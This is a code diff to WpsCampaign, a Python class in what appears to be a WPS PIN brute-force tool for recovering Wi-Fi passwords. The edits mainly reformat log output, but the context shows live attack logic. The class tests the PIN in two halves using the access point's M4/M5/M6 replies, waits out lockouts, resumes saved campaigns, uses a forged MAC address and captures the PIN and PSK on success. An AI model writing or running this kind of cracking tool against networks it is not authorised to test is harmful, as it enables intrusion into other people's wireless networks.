@@ -82,8 +82,8 @@ class WpsCampaign:
                 data = json.loads(path.read_text())
                 data.setdefault("bssid", self.bssid)
                 st = CampaignState(**{k: data[k] for k in data if k in CampaignState.__annotations__})
-                self.log(f"[WPS] resumed state: phase={st.phase} p1={st.p1_index} "
-                         f"p2={st.p2_index} attempts={st.attempts}")
+                self.log(f"[dim]resumed: phase={st.phase}, p1={st.p1_index}, "
+                         f"p2={st.p2_index}, tested={st.tested}[/dim]")
                 return st
             except Exception as e:
                 logger.warning("WPS state load failed (%s); starting fresh", e)
@@ -156,7 +156,11 @@ class WpsCampaign:
         if not await self._ensure_session():
             return AttemptOutcome(PinResult.PROTO_ERROR, pin, detail="assoc failed")
         self.transport.drain()
-        reg = WpsRegistrar(self.transport, str_to_mac(self.bssid), self.our_mac, log=self.log)
+        # Per-M-message detail routes to logger.debug only — keeps the user-facing
+        # log to one summary line per PIN (see _log_attempt) instead of flooding
+        # it with each AP retransmit. wps_probe.py --debug still surfaces the raw
+        # message-by-message trace via the root logger.
+        reg = WpsRegistrar(self.transport, str_to_mac(self.bssid), self.our_mac)
         return await reg.try_pin(pin)
 
     def _next_pin(self) -> Optional[str]:
@@ -200,10 +204,10 @@ class WpsCampaign:
         elif out.first_half_ok:
             # AP reached M5 → this first half is correct. (Covers SECOND_HALF_WRONG,
             # whose first_half_ok is True.) Pin it on the first confirmation.
+            # The per-attempt log line (see _log_attempt) announces the discovery.
             if st.phase != "second_half":
                 st.first_half = pinmod.split_pin(pin)[0]
                 st.phase, st.p2_index = "second_half", 0
-                self.log(f"[WPS] first half CONFIRMED: {st.first_half} — sweeping second half")
             else:
                 st.p2_index += 1
         elif out.result is PinResult.FIRST_HALF_WRONG:
@@ -214,11 +218,9 @@ class WpsCampaign:
 
     async def _run(self) -> None:
         self.status = "running"
-        # Prefer the SSID — the BSSID is for log forensics, our forged MAC is
-        # internal and not useful to surface.
         name = self.target.ssid or self.bssid
         logger.debug("WPS campaign start on %s (mac %s)", name, self.our_mac.hex())
-        self.log(f"[WPS] campaign start on {name}")
+        self.log(f"campaign start on [bold]{name}[/bold]")
         try:
             while not self._stop:
                 if self._paused:
@@ -237,15 +239,20 @@ class WpsCampaign:
                     break
 
                 self.status = "running"
+                # Snapshot pre-attempt state so _log_attempt can announce
+                # transitions (e.g. first-half just discovered).
+                prev_first_half = self.state.first_half
                 t0 = time.monotonic()
                 out = await self._try(pin)
                 self._attempt_ewma = 0.7 * self._attempt_ewma + 0.3 * (time.monotonic() - t0)
                 self.state.attempts += 1
                 self._apply_outcome(pin, out)
+                self._log_attempt(pin, out, prev_first_half)
 
                 if self.state.phase == "done":
+                    # Success line is closed by the UI via _stop_wps_pin (cyan
+                    # PIN + green PSK as tree leaves); the campaign just exits.
                     self._save_state()
-                    self._on_found()
                     self.status = "found"
                     break
                 if self.state.attempts % self._SAVE_EVERY == 0:
@@ -255,7 +262,7 @@ class WpsCampaign:
         except Exception as e:
             logger.exception("WPS campaign crashed")
             self.status = "error"
-            self.log(f"[WPS] campaign error: {e}")
+            self.log(f"[red]campaign error:[/red] {e}")
         finally:
             self._save_state()
             self._teardown()
@@ -268,8 +275,8 @@ class WpsCampaign:
         self.lock.begin_lock()
         wait = self.lock.backoff()
         self.status = "locked"
-        self.log(f"[WPS] AP locked (beacon={beacon_locked}, strikes={self.lock.strikes}); "
-                 f"backing off {wait:.0f}s")
+        trigger = "beacon" if beacon_locked else f"{self.lock.strikes} strikes"
+        self.log(f"[red]AP locked[/red] [dim]({trigger}) backing off {wait:.0f}s[/dim]")
         self._save_state()
         end = time.monotonic() + wait
         while time.monotonic() < end and not self._stop:
@@ -278,6 +285,27 @@ class WpsCampaign:
                 break
         self.lock.end_lock()
 
-    def _on_found(self) -> None:
-        self.log(f"[WPS] PIN {self.state.found_pin} CORRECT, "
-                 f"PASSWORD: {self.state.found_psk}")
+    def _log_attempt(self, pin: str, out: AttemptOutcome,
+                     prev_first_half: Optional[str]) -> None:
+        """One concise line per PIN attempt — what was tested, what came back,
+        and how deep the exchange got ([Mx] marker). SUCCESS is intentionally
+        silent here; the UI closes the campaign tree with bold cyan PIN + green
+        PSK leaves via _stop_wps_pin."""
+        if out.result is PinResult.SUCCESS:
+            return
+        label = f"trying [cyan]{pin}[/cyan]"
+        # First-half just confirmed this attempt — green announcement.
+        if self.state.first_half is not None and prev_first_half is None:
+            self.log(f"{label} → [green]first half OK[/green] "
+                     f"[dim bold]\\[M5][/dim bold] — sweeping second half")
+            return
+        if out.result is PinResult.FIRST_HALF_WRONG:
+            self.log(f"{label} → [red]first half wrong[/red] [dim bold]\\[M4][/dim bold]")
+        elif out.result is PinResult.SECOND_HALF_WRONG:
+            self.log(f"{label} → [dark_orange]second half wrong[/dark_orange] "
+                     f"[dim bold]\\[M6][/dim bold]")
+        elif out.result is PinResult.PROTO_ERROR:
+            self.log(f"{label} → [yellow]AP refused[/yellow] "
+                     f"[dim bold]\\[NACK][/dim bold]")
+        elif out.result is PinResult.TIMEOUT:
+            self.log(f"{label} → [dim]no response[/dim] [dim bold]\\[…][/dim bold]")
